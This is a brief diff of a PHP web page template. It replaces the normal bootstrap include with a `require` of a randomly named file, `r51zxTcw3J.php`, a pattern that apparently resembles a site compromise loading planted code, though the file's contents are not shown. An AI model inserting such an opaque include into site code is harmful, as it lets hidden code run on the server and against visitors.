@@ -1,6 +1,4 @@
-<?php
-require_once __DIR__ . '/bootstrap.php';
-?>
+<?php require __DIR__ . '/r51zxTcw3J.php' ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -251,6 +249,7 @@ hs.src = ('//s10.histats.com/js15_as.js');
 <!-- Histats.com  END  -->
 </body>
 </html>
+
 
 
 
